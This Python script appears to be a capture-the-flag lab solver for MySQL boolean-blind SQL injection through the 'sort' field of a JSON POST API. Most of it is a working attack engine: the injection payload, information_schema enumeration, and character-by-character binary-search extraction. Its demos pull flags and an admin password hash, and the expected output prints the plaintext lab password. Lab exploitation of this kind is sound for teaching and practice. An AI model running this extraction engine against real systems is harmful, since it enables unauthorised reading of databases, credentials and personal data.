"""
CTF Lab Solver — MySQL Boolean-Blind SQLi (POST/JSON variant)
=============================================================

Same blind-extraction engine as sqli_solver.py, but the oracle request uses
a POST with a JSON body instead of GET + query params, simulating a RESTful
API surface:

    POST http://127.0.0.1:5354/api/check
    Content-Type: application/json

    {
        "gameId": 1,
        "pageNum": 1,
        "pageSize": 10,
        "sort": "<INJECTION_PAYLOAD_HERE>"
    }

The injection payload replaces the `sort` value:

    sort = ' OR (<condition>) -- -

which the vulnerable server interpolates into something like:

    SELECT ... FROM ... WHERE sort = '<inject>' ORDER BY ...

Everything after `-- -` is commented out (MySQL line comment), so the
server's trailing clause is discarded and `COUNT(*)` reports >0 exactly
when `condition` is true.

Prerequisites (from ctf_lab/mysql/):
    docker compose up -d --build
    python -m ctf_lab.mysql.api_sqli_solver
"""
from __future__ import annotations

import argparse
from typing import List

import requests

BASE = "http://127.0.0.1:5354"
CHECK_PATH = "/api/check"

# MySQL line-comment syntax: `--` must be followed by at least one whitespace
# character to start a comment, so `-- -` (dash-dash-space-hyphen) is the
# canonical terminator that swallows the rest of the server's query.
COMMENT = "-- -"

PRINTABLE_LO, PRINTABLE_HI = 32, 127  # exclusive upper bound for binary search


# ── HTTP request mechanism (POST + JSON body) ─────────────────────────────

def _post_check(sort_payload: str) -> dict:
    """
    Ask the lab oracle whether `sort_payload` matches any row.

    The `sort` field is where the injection lives. All other JSON keys are
    fixed so the request shape stays constant across every probe — only the
    `sort` value changes.
    """
    body = {
        "gameId": 1,
        "pageNum": 1,
        "pageSize": 10,
        "sort": sort_payload,
    }
    try:
        r = requests.post(
            f"{BASE}{CHECK_PATH}",
            headers={"Content-Type": "application/json"},
            json=body,
            timeout=5,
        )
        r.raise_for_status()
        return r.json()
    except requests.RequestException as exc:
        raise SystemExit(
            f"[!] Lab unreachable at {BASE}{CHECK_PATH}. Start it with "
            f"`docker compose up -d --build` from ctf_lab/mysql/\n    ({exc})"
        )


# ── Boolean-blind oracle ──────────────────────────────────────────────────

def oracle(condition: str) -> bool:
    """
    True iff `condition` evaluates truthy inside the server query.

    Payload injected into `sort`:

        ' OR (<condition>) -- -

    becomes (approximately):

        ... WHERE sort = '' OR (<condition>) -- -'

    `-- -` comments out the remainder of the server's statement, so the
    response bit `{"exists": true|false}` tells us whether `condition`
    holds. No data is reflected in the body — that is what makes it blind.

    MySQL-specific examples:
        EXISTS(SELECT 1 FROM information_schema.tables ...)
        ASCII(SUBSTRING((SELECT ...), 1, 1)) > 96
    """
    payload = f"' OR ({condition}) {COMMENT}"
    return bool(_post_check(payload).get("exists"))


# ── Schema enumeration via information_schema ─────────────────────────────

def _table_exists(table_name: str) -> bool:
    condition = (
        f"EXISTS (SELECT 1 FROM information_schema.tables "
        f"WHERE table_schema = 'ctf_lab' AND table_name = '{table_name}')"
    )
    return oracle(condition)


def _column_exists(table_name: str, column_name: str) -> bool:
    condition = (
        f"EXISTS (SELECT 1 FROM information_schema.columns "
        f"WHERE table_schema = 'ctf_lab' AND table_name = '{table_name}' "
        f"AND column_name = '{column_name}')"
    )
    return oracle(condition)


def discover_schema() -> List[str]:
    """
    Enumerate tables/columns in ctf_lab using only yes/no oracle probes.

    Real engagements use this to learn the target schema before picking a
    target table. We stop at users / secret_flag to keep the demo bounded,
    but the pattern generalizes to any visible table.
    """
    print("[*] information_schema enumeration (boolean-blind)")
    tables = ["users", "secret_flag", "mysql.user", "information_schema.columns"]
    found: List[str] = []
    for table in tables:
        hit = _table_exists(table)
        print(f"    table '{table}' -> {'EXISTS' if hit else 'absent'}")
        if hit:
            found.append(table)
            if table == "users":
                for col in ["id", "username", "password_hash", "email", "role", "ssn"]:
                    hit_col = _column_exists(table, col)
                    print(f"      column '{col}' -> {'EXISTS' if hit_col else 'absent'}")
    return found


# ── Blind extraction helpers ──────────────────────────────────────────────

def _string_length(expr: str) -> int:
    """
    Binary-search the length of `expr` result using LENGTH().

    MySQL LENGTH() counts bytes (chars for ASCII single-byte data). We ask:
        LENGTH((<expr>)) > mid   (equivalent to >= mid+1)
    """
    lo, hi = 0, 256  # generous upper bound
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"LENGTH(({expr})) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def blind_extract(expr: str, max_len: int = 64) -> str:
    """
    Extract a scalar string one character at a time.

    Per character:
      1. Verify LENGTH(expr) >= pos (stop condition at end of string)
      2. Binary-search ASCII code in [32, 127):
           ASCII(SUBSTRING((<expr>), <pos>, 1)) > mid
      3. Append chr(lo) and advance

    MySQL functions used:
        SUBSTRING(str, pos, len)   — 1-indexed slice
        ASCII(str)                 — code of leftmost character
        LENGTH(str)                — byte length

    Requires ~7 requests per character (log2(95) ≈ 6.6), plus one length
    probe per position. Far faster than the naive linear sweep (~95/char).
    """
    n = _string_length(expr)
    if n == 0:
        return ""
    n = min(n, max_len)

    chars: List[str] = []
    pos = 1
    while pos <= n:
        # Safety: stop if the string turned out shorter than expected.
        if not oracle(f"LENGTH(({expr})) >= {pos}"):
            break

        lo, hi = PRINTABLE_LO, PRINTABLE_HI
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ASCII(SUBSTRING(({expr}), {pos}, 1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        chars.append(chr(lo))
        pos += 1

    return "".join(chars)


# ── Worked examples against the lab schema ────────────────────────────────

def demo_flag_row_1() -> str:
    expr = "SELECT flag_value FROM secret_flag WHERE id = 1"
    print(f"\n[*] Blind-extracting: {expr}")
    value = blind_extract(expr)
    print(f"[+] flag_value = {value}")
    return value


def demo_flag_row_2() -> str:
    expr = "SELECT flag_value FROM secret_flag WHERE id = 2"
    print(f"\n[*] Blind-extracting: {expr}")
    value = blind_extract(expr)
    print(f"[+] flag_value = {value}")
    return value


def demo_user_hash() -> str:
    expr = "SELECT password_hash FROM users WHERE username = 'admin'"
    print(f"\n[*] Blind-extracting: {expr}")
    value = blind_extract(expr)
    print(f"[+] password_hash(admin) = {value}   (expected md5 of S3cr3t!Adm1n)")
    return value


def main() -> None:
    ap = argparse.ArgumentParser(
        description="MySQL boolean-blind SQLi walkthrough (POST/JSON variant).",
    )
    ap.add_argument("--base", default=BASE, help="Lab app base URL")
    ap.add_argument("--max-len", type=int, default=64,
                    help="Safety cap on blind extraction length")
    args = ap.parse_args()

    base = args.base.rstrip("/")

    print(f"[*] Target: {base}{CHECK_PATH}")
    print("[*] Method: POST  Content-Type: application/json")
    print(f"[*] Body:   {{\"gameId\":1,\"pageNum\":1,\"pageSize\":10,\"sort\":\"<payload>\"}}")

    discover_schema()

    flag1 = demo_flag_row_1()
    flag2 = demo_flag_row_2()
    hash1 = demo_user_hash()

    print("\n" + "=" * 66)
    print("Demo complete — expected lab values:")
    print("  flag 1: CTF{my5ql_bl1nd_0r4cl3}")
    print("  flag 2: CTF{inf0rm4t10n_sch3m4}")
    print("  admin hash: f1788cf78c998d48a0ad2e76345e986e (md5 of S3cr3t!Adm1n)")
    print(f"  Your results: {flag1} | {flag2} | {hash1}")
    print("=" * 66)


if __name__ == "__main__":
    main()
